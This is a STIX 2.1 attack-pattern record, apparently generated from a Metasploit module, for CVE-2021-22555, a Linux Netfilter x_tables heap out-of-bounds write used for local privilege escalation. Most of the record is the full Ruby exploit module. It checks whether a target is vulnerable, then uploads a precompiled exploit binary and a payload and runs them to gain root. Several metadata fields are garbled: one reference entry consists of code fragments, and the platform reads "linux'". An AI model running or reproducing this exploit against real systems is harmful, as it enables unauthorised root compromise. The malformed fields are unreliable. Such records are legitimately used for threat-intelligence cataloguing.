{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94ddbd82-34a1-4177-8e45-986138ce1f98",
    "created": "2024-08-14T16:59:21.00107Z",
    "modified": "2024-08-14T16:59:21.001075Z",
    "name": "Netfilter x_tables Heap OOB Write Privilege Escalation",
    "description": " A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space. Kernels up to 5.11 (including) are vulnerable. More information about vulnerable kernels is",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/netfilter_xtables_heap_oob_write_priv_esc.rb",
            "external_id": "netfilter_xtables_heap_oob_write_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22555"
        },
        {
            "source_name": "reference",
            "url": "https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22555"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/CVE-2021-22555"
        },
        {
            "source_name": "ubuntu_offsets=strip_comments(get_external_source_code(CVE-2021-22555",
            "external_id": "exploit.c)).scan(/kernels\\\\=\\{(.+?)\\};/m).flatten.first"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n  include Msf::Post::Common\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netfilter x_tables Heap OOB Write Privilege Escalation',\n        'Description' => %q{\n          A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c.\n          This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space.\n          Kernels up to 5.11 (including) are vulnerable.\n          More information about vulnerable kernels is\n          available at https://nvd.nist.gov/vuln/detail/CVE-2021-22555#vulnConfigurationsArea\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Andy Nguyen (theflow@)', # The original author of this exploit\n          'Szymon Janusz',          # The author of this module\n          'bcoles'                  # Updated the C source code to provide more targets\n        ],\n        'DisclosureDate' => '2021-07-07', # YYYY-DD-MM. Public disclosure date\n        'Platform' => 'linux',\n        'Arch' => [ ARCH_X64 ],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [ UNRELIABLE_SESSION ], # The module could fail to get root sometimes.\n          'Stability' => [ OS_RESOURCE_LOSS ], # After too many failed attempts, the system needs to be restarted.\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'References' => [\n          ['CVE', '2021-22555'],\n          ['URL', 'https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-22555'],\n          ['URL', 'https://ubuntu.com/security/CVE-2021-22555']\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('WritableDir', [true, 'Directory to write persistent payload file.', '/var/tmp']),\n        OptInt.new('CmdTimeout', [true, 'Maximum number of seconds to wait for the exploit to complete', 10])\n      ]\n    )\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def cmd_timeout\n    datastore['CmdTimeout'].to_i\n  end\n\n  def get_external_source_code(cve, file)\n    file_path = ::File.join(::Msf::Config.install_root, \"external/source/exploits/#{cve}/#{file}\")\n    ::File.binread(file_path)\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def check\n    unless kernel_modules.include? 'ip_tables'\n      vprint_warning('The ip_tables module is not loaded.')\n      return CheckCode::Safe('The ip_tables module is not loaded.')\n    end\n\n    return CheckCode::Safe('LKRG is installed.') if lkrg_installed?\n    return CheckCode::Safe('grsecurity is in use') if grsec_installed?\n\n    release = kernel_release\n    version = \"#{release} #{kernel_version.split(' ').first}\"\n    ubuntu_offsets = strip_comments(get_external_source_code('CVE-2021-22555', 'exploit.c')).scan(/kernels\\[\\] = \\{(.+?)\\};/m).flatten.first\n    ubuntu_kernels = ubuntu_offsets.scan(/\"(.+?)\"/).flatten\n    if ubuntu_kernels.empty?\n      fail_with(Msf::Module::Failure::BadConfig, 'Error parsing the list of supported kernels.')\n    end\n    return CheckCode::Safe(\"Ubuntu kernel #{version} is not vulnerable.\") if !ubuntu_kernels.include? version\n\n    # Setting the MSGMNI to a lower value is an easy remedy for this exploit on vulnerable kernels.\n    # Currently, the exploit uses #define NUM_MSQIDS 4096, which is the minimum allowed message queue length.\n    minimum_msgmni = 4096\n    msgmni_path = '/proc/sys/kernel/msgmni'\n    return CheckCode::Safe(\"#{msgmni_path} is not readable.\") if !readable?(msgmni_path)\n\n    msgmni = read_file(msgmni_path).to_i\n    if msgmni >= minimum_msgmni\n      return CheckCode::Appears(\"Target is running kernel release #{release}.\")\n    else\n      return CheckCode::Safe(\"The kernel's MSGMNI queue size of #{msgmni} is too small for the exploit to execute successfully, making the target invulnerable. A minimum queue size of #{minimum_msgmni} is required. This setting can only be changed using sudo on the victim machine.\")\n    end\n  end\n\n  def upload_exploit_binary\n    executable_name = rand_text_alphanumeric(5..10)\n    @executable_path = \"#{base_dir}/#{executable_name}\"\n    upload_and_chmodx(@executable_path, exploit_data('CVE-2021-22555', 'ubuntu.elf'))\n    register_file_for_cleanup(@executable_path)\n  end\n\n  def upload_payload_binary\n    payload_name = rand_text_alphanumeric(5..10)\n    @payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx(@payload_path, generate_payload_exe)\n    register_file_for_cleanup(@payload_path)\n  end\n\n  def run_payload\n    response = cmd_exec(@executable_path, @payload_path, cmd_timeout)\n    vprint_status(response)\n    if response =~ /No space left on device/\n      # After too many failed attempts, the system needs to be restarted.\n      fail_with(Failure::PayloadFailed, 'The exploit failed! To try again, the remote system needs to be restarted as the memory has been corrupted.')\n    elsif response =~ /Error could not corrupt any primary message/ || response =~ /Error could not leak adjacent secondary message/\n      fail_with(Failure::PayloadFailed, 'The exploit failed when trying to corrupt the message queue. You can try running the exploit again.')\n    elsif response =~ /system is not using an Ubuntu kernel/\n      fail_with(Failure::PayloadFailed, 'The target is not running an Ubuntu kernel.')\n    elsif response =~ /not recognized/\n      fail_with(Failure::PayloadFailed, 'The target is running a kernel version that is currently not supported by the exploit.')\n    end\n    print_status('Payload executed!')\n  end\n\n  def exploit\n    fail_with(Failure::BadConfig, \"#{base_dir} is not writable.\") if !writable?(base_dir)\n\n    print_status('Dropping pre-compiled binaries to system...')\n    upload_exploit_binary\n    print_status('Uploading payload...')\n    upload_payload_binary\n    print_status('Running payload on remote system...')\n    run_payload\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-07-07, # YYYY-DD-MM. Public disclosure date",
    "x_mitre_platforms": [
        "linux'"
    ]
}